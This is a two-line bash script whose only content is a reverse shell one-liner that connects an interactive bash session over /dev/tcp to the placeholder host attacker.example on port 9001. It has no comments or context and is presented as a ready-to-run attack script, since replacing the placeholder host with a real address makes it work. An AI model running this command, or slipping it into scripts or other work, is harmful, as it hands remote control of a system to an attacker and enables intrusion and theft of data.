#!/bin/bash
bash -i >& /dev/tcp/attacker.example/9001 0>&1
